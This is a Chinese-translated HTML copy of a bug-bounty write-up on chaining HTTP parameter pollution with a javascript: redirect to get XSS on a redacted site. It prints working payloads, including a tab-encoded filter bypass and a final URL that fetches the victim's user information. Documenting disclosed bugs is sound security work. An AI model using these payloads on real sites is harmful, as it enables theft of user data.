<html>
<head>
<title>Steal User Information - Chaining XSS &amp; Http Parameter Pollution</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">窃取用户信息-链接XSS和Http参数污染</h1>
<blockquote>原文：<a href="https://levelup.gitconnected.com/stealing-user-information-via-xss-via-parameter-pollution-7d99b3379e7d?source=collection_archive---------9-----------------------#2021-01-12">https://levelup.gitconnected.com/stealing-user-information-via-xss-via-parameter-pollution-7d99b3379e7d?source=collection_archive---------9-----------------------#2021-01-12</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="30ca" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我正在闲逛，突然这条推特出现在我的新闻订阅里。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/daa10d6d7a71f6c7c10863f62df6d8b1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*pVjzAlHIMiyDhUMw.jpg"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated"><a class="ae lb" href="http://twitter.com/zseano" rel="noopener ugc nofollow" target="_blank"> @zseano </a>励志推文😁让我热泪盈眶</figcaption></figure><p id="6aad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我决定给自己一个新的开始，因为现在是2021年🎉。我登录了我的<a class="ae lb" href="https://bugcrowd.com" rel="noopener ugc nofollow" target="_blank"> bugcrowd </a>账号，根据我的技能挑选了一个合适的目标(在这个目标上我曾经发现过bug)。</p><p id="19d5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我从源代码审查开始，审查了他们的一堆javascript文件，最终发现两个端点似乎容易受到<strong class="jp ir">开放重定向+ XSS </strong>的攻击，因为开发人员允许应用程序在执行特定操作后重定向用户，而不是服务器，如下所示:</p><pre class="km kn ko kp gt lc ld le lf aw lg bi"><span id="78c8" class="lh li iq ld b gy lj lk l ll lm">function get_param(param) {<br/>    var params = {};<br/>    var url = window.location.href;<br/>    var start = url.indexOf('?');<br/>    start = start &lt; 0 ? url.length : start + 1;<br/>    var end = url.indexOf('#');<br/>    end = end &lt; 0 ? url.length : end;<br/>    var parameters = url.slice(start,end).split('&amp;');</span><span id="0929" class="lh li iq ld b gy ln lk l ll lm">for ( var i = 0; i &lt; parameters.length; i++) {<br/>        var parameter = parameters[i].split('=');<br/>        params[parameter[0]] = parameter[1];<br/>    }</span><span id="d461" class="lh li iq ld b gy ln lk l ll lm">    return params[param];<br/>}</span><span id="a968" class="lh li iq ld b gy ln lk l ll lm">// redirect from application<br/>window.location.href = get_param("continue_url"); </span></pre><h1 id="83a1" class="lo li iq bd lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk bi translated">测试</h1><p id="439e" class="pw-post-body-paragraph jn jo iq jp b jq ml js jt ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk ij bi translated">我首先试图获得一个开放的重定向，但是服务器在发现任何其他域或在<code class="fe mq mr ms ld b">continue_url</code>参数中的有效负载时重定向到一个<code class="fe mq mr ms ld b">404</code>页面。因为我已经意识到服务器的环境是Java的，并且它的流行是因为参数污染。因此，我尝试两次添加相同的参数<code class="fe mq mr ms ld b">?continue_url=redacted.com&amp;continue_url=attacker.com</code>来验证它，令我惊讶的是，服务器只检查了Uri中的第一个参数，而忽略了受我的有效负载影响的第二个参数，这只是绕过了服务器的限制，导致重定向到<code class="fe mq mr ms ld b">attacker.com</code>，但这是怎么做到的呢？让我们倒回去。</p><p id="1d29" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在那一点上，我也有点困惑，但是如果你和javascript曾经有过交集，那么你可能已经注意到了<code class="fe mq mr ms ld b">get_param(param)</code>函数有问题。很耐人寻味，不是吗？你也应该试一试。我只能说，要么是开发人员没有完全意识到Java处理多个同名参数的行为，要么是他们在编写函数时没有考虑到这个问题。因此，该函数只是用重复的条目覆盖参数(仅)的值。</p><pre class="km kn ko kp gt lc ld le lf aw lg bi"><span id="93d4" class="lh li iq ld b gy lj lk l ll lm">params[parameter[0]] = parameter[1];</span></pre><p id="7f0f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果有多个相同参数的条目，上面的代码将简单地用新值重写键<code class="fe mq mr ms ld b">continue_url</code>的旧值。因此，如果我们用我们提供的参数调试上面的代码行，它看起来会像这样:</p><pre class="km kn ko kp gt lc ld le lf aw lg bi"><span id="7c59" class="lh li iq ld b gy lj lk l ll lm">// setting value to continue_url<br/>params["continue_url"] = "redacted.com"; </span><span id="8130" class="lh li iq ld b gy ln lk l ll lm">// overwriting continue_url using parameter pollution<br/>params["continue_url"] = "attacker.com";</span></pre><p id="6c48" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，params对象最终将包含以下键/值:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mt"><img src="../Images/2b9018efdcb6545b8d4192b32692f2fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-4RJIaYHFdBYUkkXksYwUw.png"/></div></div></figure><h1 id="afc6" class="lo li iq bd lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk bi translated">获取XSS并窃取用户信息</h1><p id="0f3b" class="pw-post-body-paragraph jn jo iq jp b jq ml js jt ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk ij bi translated">在掌握了服务器故障的诀窍后，我最终试图将这个问题升级到XSS，并用javascript有效载荷<code class="fe mq mr ms ld b">?continue_url=redacted.com&amp;continue_url=javascript:alert(1)</code>替换它的值，但不幸的是，服务器返回了<strong class="jp ir"> 400错误请求</strong>错误，我就像这样:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mu"><img src="../Images/02677581ce86b4e37634ee4b23576ef7.png" data-original-src="https://miro.medium.com/v2/resize:fit:960/1*UodO_iqwv2hBCsNYl8UsSg.gif"/></div></figure><p id="1cb0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，在使用<code class="fe mq mr ms ld b">continue_url</code>参数后，我们发现即使通过参数污染绕过404错误，服务器仍然有一点安全，它会检查与<code class="fe mq mr ms ld b"><strong class="jp ir">javascript</strong></code>相关的关键字，并限制带有<strong class="jp ir"> 400 </strong>错误的响应。</p><p id="c824" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以，我想出了以下测试案例:</p><pre class="km kn ko kp gt lc ld le lf aw lg bi"><span id="5b35" class="lh li iq ld b gy lj lk l ll lm"><strong class="ld ir">x</strong>javascript:alert(1)  // 400 Bad Request<br/>javaScript<strong class="ld ir">x</strong>:alert(1)  // 400 Bad Request<br/><strong class="ld ir">x</strong>javascript<strong class="ld ir">x</strong>:alert(1) // 400 Bad Request<br/>java<strong class="ld ir">x</strong>script:alert(1)  // 200 OK (Breaking javascript)</span></pre><p id="c56e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在检查了这些测试案例后，我得出结论，服务器要么使用regex从参数字符串中提取并匹配可能的<strong class="jp ir"> javascript </strong>关键字，以防止其受到XSS攻击。但是有一种简单的方法可以绕过这种限制，那就是在有效载荷中放入一个urlencoded制表符<code class="fe mq mr ms ld b"><strong class="jp ir">%09</strong></code>，它可以简单地破坏服务器的验证，而javascript完全忽略制表符，这会导致弹出一个警告。所以我使用的最终有效载荷是:</p><pre class="km kn ko kp gt lc ld le lf aw lg bi"><span id="44a3" class="lh li iq ld b gy lj lk l ll lm">javas<strong class="ld ir">%09</strong>cript:alert(1) // 200 OK</span></pre><p id="b477" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在创建POC的同时，我想为什么不像我们一直做的那样，通过窃取用户信息来提高严重性，并编写了一个简单的脚本来窃取当前登录的用户详细信息:</p><pre class="km kn ko kp gt lc ld le lf aw lg bi"><span id="87d1" class="lh li iq ld b gy lj lk l ll lm"><strong class="ld ir">Script:</strong><br/>fetch("https://redacted.com/path/to/userinfo").then(a =&gt; a.json()).then(a =&gt; console.log(a.response)); // Instead of logging user info, an attacker may send it to his/her server</span><span id="b2cd" class="lh li iq ld b gy ln lk l ll lm"><strong class="ld ir">// final payload</strong><br/>https://redacted.com/endpoint?continue_url=redacted.com&amp;continue_url=java%09Script:fetch(%22https://redacted.com/path/to/userinfo%22).then(a%3D%3Ea.json()).then(a%3D%3Econsole.log(a.response));//</span></pre><h1 id="a6f3" class="lo li iq bd lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk bi translated">控制台中记录的受害者信息:</h1><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mv"><img src="../Images/9ecf6210f36200fab6137bec58633631.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wdDWP_wEZNPEcZ01ePL24Q.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">攻击者可能会将其发送到他/她的服务器，但我们只是登录到控制台进行演示。</figcaption></figure><p id="f758" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最终，我把它上报给了这个项目，经过几天的筛选，我终于获得了一个很好的奖励💰那是我2021年的第一笔赏金🎉</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mw"><img src="../Images/3fdac005eb0c60b11d3332b45e7e327b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vMfmskcSMKbv87XhPSMbkw.png"/></div></div></figure><p id="946f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在推特上关注我:<a class="ae lb" href="https://twitter.com/hamzaavvan" rel="noopener ugc nofollow" target="_blank">哈姆扎·阿夫万</a><a class="ae lb" href="https://twitter.com/hamzaavvan" rel="noopener ugc nofollow" target="_blank">@哈姆扎·阿夫万</a></p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="mx my l"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><a href="https://www.digitalocean.com/?refcode=7b5b6401934f&amp;utm_campaign=Referral_Invite&amp;utm_medium=Referral_Program&amp;utm_source=badge"><div class="gh gi mz"><img src="../Images/9283513f16bb07df227bc70559890a67.png" data-original-src="https://miro.medium.com/v2/resize:fit:466/format:webp/1*w2iZLqkP0A_TKHeTDiSGbw.png"/></div></a><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">道德黑客的快速可靠的VPS</figcaption></figure></div></div>    
</body>
</html>